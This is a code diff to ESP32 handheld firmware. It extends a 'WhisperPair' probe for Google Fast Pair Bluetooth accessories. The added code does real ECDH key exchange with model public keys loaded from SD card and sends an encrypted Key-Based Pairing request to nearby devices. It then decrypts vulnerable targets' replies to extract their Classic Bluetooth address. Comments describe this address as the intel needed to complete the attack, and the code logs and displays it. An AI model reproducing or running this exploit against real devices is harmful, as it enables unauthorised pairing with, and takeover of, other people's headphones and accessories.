@@ -59,6 +59,12 @@
 #include <NimBLEDevice.h>
 #include <SD.h>
 #include <esp_random.h>
+#include <mbedtls/ecp.h>
+#include <mbedtls/ecdh.h>
+#include <mbedtls/aes.h>
+#include <mbedtls/sha256.h>
+#include <mbedtls/ctr_drbg.h>
+#include <mbedtls/entropy.h>
 
 #define WP_MAX_TARGETS    24
 #define WP_FE2C_UUID      "0000fe2c-0000-1000-8000-00805f9b34fb"
@@ -153,6 +159,141 @@ class wp_scan_cb : public NimBLEScanCallbacks {
 };
 static wp_scan_cb s_cb;
 
+/* --- Anti-spoofing public keys (secp256r1, 64 bytes = X||Y) ------------
+ * Each Fast Pair accessory model is provisioned with its own keypair at
+ * manufacture. The PUBLIC half is published in Google's Fast Pair registry
+ * keyed by 24-bit model ID, so any seeker can perform ECDH to derive the
+ * shared secret used to authenticate Key-Based Pairing.
+ *
+ * For POSEIDON we pre-bake a small lookup so the probe can upgrade from
+ * "garbage ciphertext sentinel" to real ECDH + decrypted response — which
+ * means we can actually READ the BR/EDR address out of the KBP response
+ * notify on vulnerable targets. This is the piece of intel that would
+ * hand off to external Classic-BT hardware to complete the attack.
+ *
+ * The lookup starts empty — users collect pubkeys from the Fast Pair
+ * companion app traffic (adb logcat during pairing, or Wireshark on a
+ * rooted phone) and drop them into /poseidon/fastpair_keys.bin on SD.
+ *
+ * File format (no framing, just repeating records):
+ *   offset 0..2  : model_id   (24-bit big-endian)
+ *   offset 3..66 : pubkey X||Y (64 bytes raw)
+ *
+ * 67 bytes per record. Up to 64 records = 4288 bytes. Cheap. */
+#define WP_MAX_KEYS   64
+struct wp_key_t { uint32_t model_id; uint8_t pub[64]; };
+static wp_key_t s_keys[WP_MAX_KEYS];
+static int s_keys_n = 0;
+
+static void load_pubkeys(void)
+{
+    s_keys_n = 0;
+    if (!sd_mount()) return;
+    File f = SD.open("/poseidon/fastpair_keys.bin", FILE_READ);
+    if (!f) return;
+    while (f.available() >= 67 && s_keys_n < WP_MAX_KEYS) {
+        uint8_t rec[67];
+        if (f.read(rec, 67) != 67) break;
+        wp_key_t &k = s_keys[s_keys_n++];
+        k.model_id = ((uint32_t)rec[0] << 16) | ((uint32_t)rec[1] << 8) | rec[2];
+        memcpy(k.pub, rec + 3, 64);
+    }
+    f.close();
+    Serial.printf("[wp] loaded %d anti-spoofing pubkeys\n", s_keys_n);
+}
+
+static const uint8_t *find_pubkey(uint32_t model_id)
+{
+    for (int i = 0; i < s_keys_n; ++i)
+        if (s_keys[i].model_id == model_id) return s_keys[i].pub;
+    return nullptr;
+}
+
+/* --- Crypto helpers ---------------------------------------------------- */
+/* Generate ephemeral secp256r1 keypair. priv/pub are 32B / 64B raw bytes. */
+static bool ecdh_gen_ephemeral(uint8_t priv[32], uint8_t pub[64])
+{
+    mbedtls_ecp_group grp;
+    mbedtls_mpi d;
+    mbedtls_ecp_point Q;
+    mbedtls_entropy_context ent;
+    mbedtls_ctr_drbg_context drbg;
+    mbedtls_ecp_group_init(&grp);
+    mbedtls_mpi_init(&d);
+    mbedtls_ecp_point_init(&Q);
+    mbedtls_entropy_init(&ent);
+    mbedtls_ctr_drbg_init(&drbg);
+    bool ok = false;
+    const char *pers = "poseidon-wp";
+    do {
+        if (mbedtls_ctr_drbg_seed(&drbg, mbedtls_entropy_func, &ent,
+                                  (const uint8_t *)pers, strlen(pers)) != 0) break;
+        if (mbedtls_ecp_group_load(&grp, MBEDTLS_ECP_DP_SECP256R1) != 0) break;
+        if (mbedtls_ecdh_gen_public(&grp, &d, &Q, mbedtls_ctr_drbg_random, &drbg) != 0) break;
+        if (mbedtls_mpi_write_binary(&d, priv, 32) != 0) break;
+        if (mbedtls_mpi_write_binary(&Q.MBEDTLS_PRIVATE(X), pub + 0,  32) != 0) break;
+        if (mbedtls_mpi_write_binary(&Q.MBEDTLS_PRIVATE(Y), pub + 32, 32) != 0) break;
+        ok = true;
+    } while (0);
+    mbedtls_ctr_drbg_free(&drbg);
+    mbedtls_entropy_free(&ent);
+    mbedtls_ecp_point_free(&Q);
+    mbedtls_mpi_free(&d);
+    mbedtls_ecp_group_free(&grp);
+    return ok;
+}
+
+/* Derive K = SHA256(shared.x)[0:16] from our priv + provider pub. */
+static bool ecdh_derive_k(const uint8_t priv[32], const uint8_t provider_pub[64],
+                          uint8_t k[16])
+{
+    mbedtls_ecp_group grp;
+    mbedtls_mpi d, z;
+    mbedtls_ecp_point Q;
+    mbedtls_ecp_group_init(&grp);
+    mbedtls_mpi_init(&d); mbedtls_mpi_init(&z);
+    mbedtls_ecp_point_init(&Q);
+    bool ok = false;
+    do {
+        if (mbedtls_ecp_group_load(&grp, MBEDTLS_ECP_DP_SECP256R1) != 0) break;
+        if (mbedtls_mpi_read_binary(&d, priv, 32) != 0) break;
+        if (mbedtls_mpi_read_binary(&Q.MBEDTLS_PRIVATE(X), provider_pub + 0,  32) != 0) break;
+        if (mbedtls_mpi_read_binary(&Q.MBEDTLS_PRIVATE(Y), provider_pub + 32, 32) != 0) break;
+        if (mbedtls_mpi_lset(&Q.MBEDTLS_PRIVATE(Z), 1) != 0) break;
+        if (mbedtls_ecdh_compute_shared(&grp, &z, &Q, &d, nullptr, nullptr) != 0) break;
+        uint8_t shared_x[32];
+        if (mbedtls_mpi_write_binary(&z, shared_x, 32) != 0) break;
+        uint8_t digest[32];
+        if (mbedtls_sha256(shared_x, 32, digest, 0) != 0) break;
+        memcpy(k, digest, 16);
+        ok = true;
+    } while (0);
+    mbedtls_ecp_point_free(&Q);
+    mbedtls_mpi_free(&z); mbedtls_mpi_free(&d);
+    mbedtls_ecp_group_free(&grp);
+    return ok;
+}
+
+static bool aes128_ecb_encrypt(const uint8_t k[16], const uint8_t in[16], uint8_t out[16])
+{
+    mbedtls_aes_context ctx;
+    mbedtls_aes_init(&ctx);
+    bool ok = (mbedtls_aes_setkey_enc(&ctx, k, 128) == 0) &&
+              (mbedtls_aes_crypt_ecb(&ctx, MBEDTLS_AES_ENCRYPT, in, out) == 0);
+    mbedtls_aes_free(&ctx);
+    return ok;
+}
+
+static bool aes128_ecb_decrypt(const uint8_t k[16], const uint8_t in[16], uint8_t out[16])
+{
+    mbedtls_aes_context ctx;
+    mbedtls_aes_init(&ctx);
+    bool ok = (mbedtls_aes_setkey_dec(&ctx, k, 128) == 0) &&
+              (mbedtls_aes_crypt_ecb(&ctx, MBEDTLS_AES_DECRYPT, in, out) == 0);
+    mbedtls_aes_free(&ctx);
+    return ok;
+}
+
 /* --- Probe state ------------------------------------------------------- */
 static volatile bool s_notify_received = false;
 static volatile int  s_notify_len      = 0;
@@ -170,8 +311,19 @@ static void kbp_notify_cb(NimBLERemoteCharacteristic *chr, uint8_t *data,
 
 enum wp_verdict_t { WP_VULNERABLE, WP_PATCHED, WP_NO_SERVICE, WP_CONNECT_FAIL };
 
+/* Decrypted response payload we pass back to the UI. */
+static bool    s_have_bredr = false;
+static uint8_t s_bredr_addr[6];
+
+/* Run the probe. If we have a pubkey for this model, do real ECDH and
+ * decrypt the response → extract BR/EDR MAC. Otherwise send a well-formed
+ * ECDH envelope with random plaintext (still legitimate-looking on the
+ * wire) — vulnerable firmware responds either way, we just can't read
+ * the response body. */
 static wp_verdict_t run_probe(const wp_target_t &t)
 {
+    s_have_bredr = false;
+
     NimBLEClient *c = NimBLEDevice::createClient();
     c->setConnectTimeout(6);
 
@@ -198,20 +350,52 @@ static wp_verdict_t run_probe(const wp_target_t &t)
     s_notify_len = 0;
     if (kbp->canNotify()) kbp->subscribe(true, kbp_notify_cb);
 
-    /* Build deliberately bogus 80-byte KBP blob:
-     *   [0..15]  random "ciphertext"    — no valid account key, no ECDH
-     *   [16..79] random 64-byte pubkey  — not a real secp256r1 point
-     * Compliant provider: AES decrypt fails → silent drop.
-     * Vulnerable provider: still sends a notify (error or malformed response)
-     *                      because the pairing-mode gate is missing. */
+    /* Generate ephemeral secp256r1 keypair (real point on the wire). */
+    uint8_t priv[32], pub[64];
+    bool ecdh_ok = ecdh_gen_ephemeral(priv, pub);
+
+    /* Derive K if we have this model's anti-spoofing pubkey. */
+    uint8_t k[16];
+    bool have_k = false;
+    const uint8_t *provider_pub = (ecdh_ok && t.mode == WP_MODE_DISCOVERABLE)
+                                  ? find_pubkey(t.model_id) : nullptr;
+    if (provider_pub) have_k = ecdh_derive_k(priv, provider_pub, k);
+
+    /* Build KBP plaintext:
+     *   [0]        0x00  type = KBP request
+     *   [1]        0x40  flags = initiate bonding
+     *   [2..7]     provider's BLE address (anti-replay bind)
+     *   [8..13]    seeker's BR/EDR address — stub zeros since we have no
+     *              BR/EDR radio on ESP32-S3; the probe doesn't bond
+     *   [14..15]   random salt
+     * If we have no K, the plaintext is effectively random too; we still
+     * send 16 encrypted bytes so the envelope shape is correct. */
+    uint8_t pt[16] = { 0 };
+    pt[0] = 0x00;
+    pt[1] = 0x40;
+    /* provider BLE addr, reversed so byte 2 = MSB */
+    for (int i = 0; i < 6; ++i) pt[2 + i] = t.addr[5 - i];
+    /* seeker BR/EDR = 00:00:00:00:00:00 (we don't have one) */
+    pt[14] = (uint8_t)esp_random();
+    pt[15] = (uint8_t)esp_random();
+
+    uint8_t ct[16];
+    if (have_k) {
+        aes128_ecb_encrypt(k, pt, ct);
+    } else {
+        /* Random ciphertext — DIY_WhisperPair approach. */
+        for (int i = 0; i < 16; ++i) ct[i] = (uint8_t)esp_random();
+    }
+
+    /* 80-byte KBP blob: 16B ciphertext || 64B ephemeral pubkey. If ECDH
+     * failed (shouldn't on ESP32-S3), fall back to random pub bytes. */
     uint8_t blob[80];
-    for (int i = 0; i < 80; ++i) blob[i] = (uint8_t)esp_random();
+    memcpy(blob, ct, 16);
+    if (ecdh_ok) memcpy(blob + 16, pub, 64);
+    else for (int i = 16; i < 80; ++i) blob[i] = (uint8_t)esp_random();
 
     bool wrote = kbp->writeValue(blob, 80, false);
-    if (!wrote) {
-        /* Some stacks fail write-without-response if MTU too small; retry with response. */
-        kbp->writeValue(blob, 80, true);
-    }
+    if (!wrote) kbp->writeValue(blob, 80, true);
 
     uint32_t start = millis();
     while (millis() - start < WP_PROBE_WAIT_MS) {
@@ -220,6 +404,20 @@ static wp_verdict_t run_probe(const wp_target_t &t)
     }
 
     bool vuln = s_notify_received;
+
+    /* If we got a 16-byte response and we know K, decrypt it and lift
+     * the BR/EDR address (response[0] = 0x01, response[1..6] = BR/EDR). */
+    if (vuln && have_k && s_notify_len >= 16) {
+        uint8_t plain[16];
+        if (aes128_ecb_decrypt(k, s_notify_buf, plain) && plain[0] == 0x01) {
+            /* Response byte order: response[1] = MSB. Store in our
+             * little-endian convention (addr[0] = LSB) to match the rest
+             * of the firmware. */
+            for (int i = 0; i < 6; ++i) s_bredr_addr[i] = plain[6 - i];
+            s_have_bredr = true;
+        }
+    }
+
     if (kbp->canNotify()) kbp->unsubscribe();
     c->disconnect();
     NimBLEDevice::deleteClient(c);
@@ -242,14 +440,20 @@ static void log_verdict(const wp_target_t &t, wp_verdict_t v)
                       : (t.mode == WP_MODE_NONDISCOVERABLE) ? "in-use"
                                                             : "unknown";
     const char *name = model_name(t.model_id);
-    char line[160];
+    char bredr[24] = "";
+    if (s_have_bredr) {
+        snprintf(bredr, sizeof(bredr), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 s_bredr_addr[5], s_bredr_addr[4], s_bredr_addr[3],
+                 s_bredr_addr[2], s_bredr_addr[1], s_bredr_addr[0]);
+    }
+    char line[200];
     snprintf(line, sizeof(line),
-             "%lu,%02X:%02X:%02X:%02X:%02X:%02X,%s,0x%06lX,%s,%s,%d\n",
+             "%lu,%02X:%02X:%02X:%02X:%02X:%02X,%s,0x%06lX,%s,%s,%d,%s\n",
              (unsigned long)millis(),
              t.addr[5], t.addr[4], t.addr[3], t.addr[2], t.addr[1], t.addr[0],
              m_str, (unsigned long)t.model_id,
              name ? name : "unknown",
-             v_str, (int)t.rssi);
+             v_str, (int)t.rssi, bredr);
     f.print(line);
     f.close();
     Serial.printf("[wp] %s", line);
@@ -362,7 +566,15 @@ static void draw_verdict(const wp_target_t &t, wp_verdict_t v)
 
     d.setTextColor(T_DIM, T_BG);
     d.setCursor(4, BODY_Y + 62);
-    d.printf("notify=%dB  rssi=%d", s_notify_len, t.rssi);
+    if (s_have_bredr) {
+        d.setTextColor(T_ACCENT, T_BG);
+        d.printf("BR/EDR %02X:%02X:%02X:%02X:%02X:%02X",
+                 s_bredr_addr[5], s_bredr_addr[4], s_bredr_addr[3],
+                 s_bredr_addr[2], s_bredr_addr[1], s_bredr_addr[0]);
+    } else {
+        d.printf("notify=%dB  rssi=%d", s_notify_len, t.rssi);
+    }
+    d.setTextColor(T_DIM, T_BG);
     d.setCursor(4, BODY_Y + 72);
     d.print("logged to /poseidon/whisperpair.csv");
 }
@@ -372,6 +584,11 @@ void feat_ble_whisperpair(void)
 {
     radio_switch(RADIO_BLE);
     s_tgt_n = 0;
+
+    /* Load any pre-baked anti-spoofing pubkeys from SD. Without these we
+     * fall back to bogus-ciphertext vulnerability detection only (can't
+     * decrypt the response → no BR/EDR extraction). */
+    load_pubkeys();
 
     NimBLEScan *scan = NimBLEDevice::getScan();
     scan->setScanCallbacks(&s_cb, true);
